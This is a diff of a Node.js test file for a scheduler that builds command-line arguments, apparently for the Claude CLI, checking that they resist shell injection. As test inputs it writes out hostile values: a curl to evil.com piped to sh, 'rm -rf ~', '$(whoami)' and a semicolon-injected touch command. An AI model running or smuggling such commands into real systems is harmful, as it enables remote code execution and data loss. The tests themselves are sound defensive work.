@@ -1,13 +1,12 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 
-import { buildScheduleCommand } from '../src/main/schedule-runner.js';
-import { quoteArgForShell, quoteArgvForShell } from '../src/main/shell-profiles.js';
+import { buildScheduleArgs } from '../src/domain/schedule/schedule';
+import { quoteArgForShell, quoteArgvForShell } from '../src/domain/shell/quoting';
 
-test('buildScheduleCommand returns argv array, not a shell string', () => {
-  const { claudeArgs } = buildScheduleCommand('session-123', {
+test('buildScheduleArgs returns argv array, not a shell string', () => {
+  const claudeArgs = buildScheduleArgs('session-123', {
     cli: { model: 'sonnet-4-6', 'allowed-tools': 'Read,Bash' },
-    prompt: 'do a thing',
   });
   assert.ok(Array.isArray(claudeArgs));
   assert.ok(claudeArgs.includes('--resume'));
@@ -16,9 +15,9 @@ test('buildScheduleCommand returns argv array, not a shell string', () => {
   assert.ok(claudeArgs.includes('sonnet-4-6'));
 });
 
-test('buildScheduleCommand preserves injection attempts as literal argv tokens (no shell interpretation)', () => {
+test('buildScheduleArgs preserves injection attempts as literal argv tokens (no shell interpretation)', () => {
   const evil = 'x"; curl evil.com/sh | sh; echo "';
-  const { claudeArgs } = buildScheduleCommand('sess', {
+  const claudeArgs = buildScheduleArgs('sess', {
     cli: { model: evil },
   });
   const idx = claudeArgs.indexOf('--model');
@@ -27,28 +26,28 @@ test('buildScheduleCommand preserves injection attempts as literal argv tokens (
   assert.equal(claudeArgs[idx + 1], evil);
 });
 
-test('buildScheduleCommand rejects max-budget-usd that is not a number', () => {
+test('buildScheduleArgs rejects max-budget-usd that is not a number', () => {
   assert.throws(() => {
-    buildScheduleCommand('sess', { cli: { 'max-budget-usd': '1; rm -rf ~' } });
+    buildScheduleArgs('sess', { cli: { 'max-budget-usd': '1; rm -rf ~' } });
   }, /max-budget-usd/);
 });
 
-test('buildScheduleCommand rejects control characters in scalar fields', () => {
+test('buildScheduleArgs rejects control characters in scalar fields', () => {
   assert.throws(() => {
-    buildScheduleCommand('sess', { cli: { model: 'foo\x00bar' } });
+    buildScheduleArgs('sess', { cli: { model: 'foo\x00bar' } });
   }, /unsafe characters/);
 });
 
-test('buildScheduleCommand allows newlines in append-system-prompt but rejects control chars', () => {
+test('buildScheduleArgs allows newlines in append-system-prompt but rejects control chars', () => {
   const withNewlines = 'line 1\nline 2\nline 3';
-  const { claudeArgs } = buildScheduleCommand('sess', {
+  const claudeArgs = buildScheduleArgs('sess', {
     cli: { 'append-system-prompt': withNewlines },
   });
   const idx = claudeArgs.indexOf('--append-system-prompt');
   assert.equal(claudeArgs[idx + 1], withNewlines);
 
   assert.throws(() => {
-    buildScheduleCommand('sess', { cli: { 'append-system-prompt': 'bad\x01stuff' } });
+    buildScheduleArgs('sess', { cli: { 'append-system-prompt': 'bad\x01stuff' } });
   }, /unsafe characters/);
 });
 
@@ -94,9 +93,8 @@ test('full simulated schedule command is safe under a malicious frontmatter', ()
       'append-system-prompt': '$(whoami)',
       'add-dirs': '/tmp,/etc; touch /tmp/pwned',
     },
-    prompt: 'scheduled task',
   };
-  const { claudeArgs } = buildScheduleCommand('sess-id', evilSchedule);
+  const claudeArgs = buildScheduleArgs('sess-id', evilSchedule);
   const cmd = 'claude ' + quoteArgvForShell('/bin/bash', claudeArgs);
 
   // Walk the command and extract only the text outside single-quoted tokens.
